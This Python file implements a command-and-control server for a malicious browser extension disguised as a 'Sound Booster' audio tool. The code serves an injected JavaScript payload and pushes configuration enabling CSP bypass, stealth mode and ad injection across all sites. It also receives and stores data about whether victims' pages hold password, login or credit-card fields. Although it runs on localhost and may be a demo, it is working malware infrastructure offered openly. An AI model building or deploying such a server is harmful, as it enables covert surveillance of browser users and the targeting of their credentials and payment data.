#!/usr/bin/env python3
"""
Sound Booster Malicious Server
Disguised as audio enhancement service, actually provides malicious code and collects data
"""

import http.server
import socketserver
import json
import os
import time
from urllib.parse import urlparse, parse_qs

PORT = 8000

class SoundBoosterHandler(http.server.SimpleHTTPRequestHandler):
    
    def end_headers(self):
        # CORS and cache control
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        if self.path == '/malicious-payload.js':
            self.serve_malicious_script()
        elif self.path.startswith('/config'):
            self.serve_config()
        elif self.path == '/status':
            self.serve_status()
        else:
            super().do_GET()

    def do_POST(self):
        if self.path.startswith('/config'):
            self.handle_config_request()
        elif self.path == '/audio-data':
            self.collect_audio_data()
        else:
            self.send_response(404)
            self.end_headers()

    def serve_malicious_script(self):
        """Serve malicious script"""
        print(f"🚨 Malicious script request from: {self.client_address[0]}")
        
        script_file = 'malicious-payload.js'
        
        if os.path.exists(script_file):
            with open(script_file, 'r', encoding='utf-8') as f:
                content = f.read()
        else:
            # Builtin malicious script
            content = '''
console.log("🎵 Sound Booster server script executing!");
if (document.body && !window.SB_SERVER_EXECUTED) {
    window.SB_SERVER_EXECUTED = true;
    const notification = document.createElement("div");
    notification.style.cssText = "position:fixed;top:20px;right:20px;background:#4CAF50;color:white;padding:16px;border-radius:10px;z-index:999999;font-family:Arial;box-shadow:0 4px 15px rgba(76,175,80,0.4);";
    notification.innerHTML = "<div style=\\"font-weight:bold;margin-bottom:5px;\\">🔊 Sound Booster Activated</div><div style=\\"font-size:12px;\\">✅ Volume boost: +50%<br>✅ Server connection successful</div>";
    notification.onclick = () => notification.remove();
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 6000);
}
            '''
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/javascript')
        self.end_headers()
        self.wfile.write(content.encode('utf-8'))

    def serve_config(self):
        """Serve configuration"""
        config = {
            "enabled": True,
            "maliciousScript": f"http://localhost:{PORT}/malicious-payload.js",
            "targets": ["*"],
            "frequency": 1.0,
            "features": {
                "audio_enhancement": True,
                "csp_bypass": True,
                "data_collection": True,
                "ad_injection": True
            }
        }
        
        print(f"📋 Configuration request from: {self.client_address[0]}")
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(config, indent=2).encode('utf-8'))

    def handle_config_request(self):
        """Handle POST configuration request"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(content_length)
            install_data = json.loads(data.decode('utf-8'))
            
            print(f"🔧 Extension installation: {install_data}")
            
            config = {
                "enabled": True,
                "maliciousScript": f"http://localhost:{PORT}/malicious-payload.js",
                "targets": ["google.com", "bing.com", "github.com", "*"],
                "updateInterval": 21600000,  # 6 hours
                "features": {
                    "stealth_mode": True,
                    "csp_bypass": True,
                    "ad_injection": True,
                    "data_collection": True
                }
            }
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(config).encode('utf-8'))
            
        except Exception as e:
            print(f"❌ Configuration processing failed: {e}")
            self.send_response(400)
            self.end_headers()

    def collect_audio_data(self):
        """Collect "audio" data"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(content_length)
            victim_data = json.loads(data.decode('utf-8'))
            
            print(f"📊 Audio data collection from: {self.client_address[0]}")
            print(f"   Domain: {victim_data.get('domain', 'unknown')}")
            print(f"   Has password fields: {victim_data.get('hasPasswordFields', False)}")
            print(f"   Has login forms: {victim_data.get('hasLoginForms', False)}")
            print(f"   Has credit card fields: {victim_data.get('hasCreditCardFields', False)}")
            
            # Save data
            filename = f"audio_data_{int(time.time())}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(victim_data, f, indent=2, ensure_ascii=False)
            
            print(f"💾 Data saved: {filename}")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            response = {"status": "success", "message": "Audio data collected"}
            self.wfile.write(json.dumps(response).encode('utf-8'))
            
        except Exception as e:
            print(f"❌ Data collection failed: {e}")
            self.send_response(400)
            self.end_headers()

    def serve_status(self):
        """Server status"""
        status = {
            "service": "Sound Booster Audio Enhancement Server",
            "version": "2.1.4",
            "status": "active",
            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "enhanced_sites": 0,
            "active_extensions": 1
        }
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(status, indent=2).encode('utf-8'))

    def log_message(self, format, *args):
        print(f"🌐 {self.client_address[0]} - {format % args}")

if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    with socketserver.TCPServer(("", PORT), SoundBoosterHandler) as server:
        print(f"🎵 Sound Booster Server starting on port {PORT}")
        print(f"📁 Working directory: {os.getcwd()}")
        print(f"📋 Available endpoints:")
        print(f"   🎵 Malicious script: http://localhost:{PORT}/malicious-payload.js")
        print(f"   ⚙️ Configuration: http://localhost:{PORT}/config")
        print(f"   📊 Server status: http://localhost:{PORT}/status")
        print(f"   📥 Data collection: POST http://localhost:{PORT}/audio-data")
        print("Press Ctrl+C to stop server")
        
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\n🛑 Server stopped")